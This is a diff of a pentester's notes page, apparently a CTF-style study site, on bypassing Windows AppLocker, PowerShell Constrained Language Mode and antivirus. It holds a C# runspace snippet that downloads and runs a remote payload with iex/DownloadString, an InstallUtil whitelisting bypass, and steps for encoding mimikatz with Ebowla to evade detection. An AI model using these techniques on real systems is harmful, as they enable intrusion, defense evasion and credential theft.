@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-04-18T01:16:25 EDT">
+<meta name="revised" content="2019-04-20T12:45:25 EDT">
 <title>Windows-Bypass :: DocDock Documentation</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -81,6 +81,13 @@
         <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
     </div>
     <ul>
+<li data-nav-id="/concepts/file-transfer/" class="dd-item">
+    <div>
+        <a href="/concepts/file-transfer/">
+            File Transfer
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
 <li data-nav-id="/concepts/webapppentest/" class="dd-item haschildren
         ">
     <div>
@@ -258,6 +265,13 @@
     <div>
 
         <a href="/hackthebox/boxes/sunday/">sunday</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/teacher/" class="dd-item">
+    <div>
+        <a href="/hackthebox/boxes/teacher/">
+            teacher
+        </a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
     </ul>
@@ -459,6 +473,7 @@
           
     <option value="/concepts/" >
    Concept</option> 
+      <option value="/concepts/file-transfer/" >- File Transfer</option>
     <option value="/concepts/webapppentest/" >
   - 
    WebAppPenTests</option>
@@ -496,7 +511,54 @@
     
     
     
-    <p>I have kept running in applocker and antivirus, and CLM (constrained language mode) I would like to cover some different ways to bypass these restrictions.</p>
+    <p>I have kept running in applocker and antivirus, and CLM (constrained language mode) I would like to cover some different ways to bypass these restrictions. CLM designed to make our job harder. Basically takes away allot methods and invoke. Which means we can&rsquo;t just call powerview and run in it memory. you could still download it and bypass Defender with some kind of encoding/encryption.</p>
+
+<p>CLM uses umci policy to determine what powershell scripts are approved(whitelisted). which seems exploitable xD</p>
+
+<p><a href="https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/">https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/</a></p>
+
+<p>*What does Constrained Language constrain?</p>
+
+<p>Constrained Language consists of a number of restrictions that limit unconstrained code execution on a locked-down system. These restrictions are:</p>
+
+<ul>
+<li>PowerShell module script files must explicitly export functions by name without the use of wildcard characters.
+This is to prevent inadvertently exposing powerful helper function not meant to be used publicly.</li>
+<li>PowerShell module manifest files must explicitly export functions by name without the use of wildcards.
+Again, to prevent inadvertent exposure of functions.</li>
+<li>COM objects are blocked.
+They can expose Win32 APIs that have likely never been rigorously hardened as part of an attack surface.</li>
+<li>Only approved .NET types are allowed.
+Many .NET types can be used to invoke arbitrary Win32 APIs. As a result only specific whitelisted types are allowed.</li>
+<li>Add-Type is blocked.
+It allows the creation of arbitrary types defined in different languages.</li>
+<li>The use of PowerShell classes are disallowed.
+PowerShell classes are just arbitrary C# type definitions.</li>
+<li>PowerShell type conversion is not allowed.
+Type conversion implicitly creates types and runs type constructors.</li>
+<li>Dot sourcing across language modes is disallowed.
+Dot sourcing a script file brings all functions, variables, aliases from that script into the current scope.
+So this blocks a trusted script from being dot sourced into an untrusted script and exposing all of its internal functions.
+Similarly, an untrusted script is prevented from being dot sourced into a trusted script so that it cannot pollute the trusted scope.</li>
+<li>Command resolution automatically hides commands you cannot run.
+For example, a function created in Constrained Language mode is not visible to script running in Full Language mode.</li>
+<li>XAML based workflows are blocked since they cannot be constrained by PowerShell.
+But script based workflows and trusted XAML based workflows shipped in-box are allowed.</li>
+<li>The SupportedCommand parameter for Import-LocalizedData is disabled.
+It allows additional commands prevented by Constrained Language.</li>
+<li>Invoke-Expression cmdlet always runs in Constrained Language.
+Invoke-Expression cannot validate input as trusted.</li>
+<li>Set-PSBreakpoint command is blocked unless there is a system-wide lockdown through UMCI.</li>
+<li>Command completers are always run in Constrained Language.
+Command completers are not validated as trustworthy.</li>
+<li>Commands and script run within the script debugger will always be run in Constrained Language if there is a system-wide lockdown.</li>
+<li>The DSC Configuration keyword is disabled.</li>
+<li>Supported commands and Statements are not allowed in script DATA sections.</li>
+<li>Start-Job is unavailable if the system is not locked-down.
+Start-Job starts PowerShell in a new process and if the system is not locked-down the new process runs in Full Language mode.</li>
+</ul>
+
+<p>*</p>
 
 <p>If PowerShell version 2 is available you may be able to use this trick.</p>
 
@@ -520,15 +582,48 @@
 <pre><code>c:\windows\microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U .\meh.exe
 </code></pre>
 
+<p>RunScapes</p>
+
+<p>Runscapes create a parallel process of power shell and execute command through that bypassing current restrictions. My Best explanation of what this is doing is that were creating a method that we call to create another shell.</p>
+
+<pre><code>static void Main(string[] args)
+{
+    Runspace run = RunspaceFactory.CreateRunspace();
+    run.Open();
+    
+    PowerShell shell = PowerShell.Create();
+    shell.Runspace = run;
+    
+    String exec = &quot;iex(new-object net.webclient).DownloadString('http://10.10.0.0/payload);
+    shell.AddScript(exec);
+    shell.Invoke();
+    
+    run.Close();
+}
+</code></pre>
+
+<pre><code>String exec = &quot;$ExecutionContext.SessionState.LanguageMode&quot;;
+shell.AddScript(exec);
+
+Collection&lt;PSObject&gt; output = shell.Invoke();
+foreach( PSOBject o in output )
+{
+    Console.Write(o.ToString());
+}
+run.Close();
+</code></pre>
+
+<p>WriteAble  executable directories.</p>
+
 <p>Bypassing anti virus</p>
 
 <p>Using, Ebowla to bypass detection, why because anti virus looks for matching code to detect malicious software. You can use encryptions and decoding to evade detection. This for me is a last resort ill spend awhile trying to bypass restrictions. I may upload binaries.</p>
 
-<p>genetic.config please review 0xdf giddy write up on setting this up. we just need to change somethings and set the computer name as the target</p>
+<p>genetic.config please review 0xdf giddy write up on setting this up. we just need to change somethings and set the computer name as the target.</p>
 
 <p>trying to get a payload to work was touchy my objective now is to encode Binary using Ebowla. I typically try to bring both copies a x86 and x64 binaries.</p>
 
-<p>note: locate mimi*.exe find the x64 version then copy it into Ebowla</p>
+<p>note: locate mimi*.exe find the x64 version then copy it into Ebowla.</p>
 
 <pre><code>python ebowla.py binary.exe genetic.config
 </code></pre>
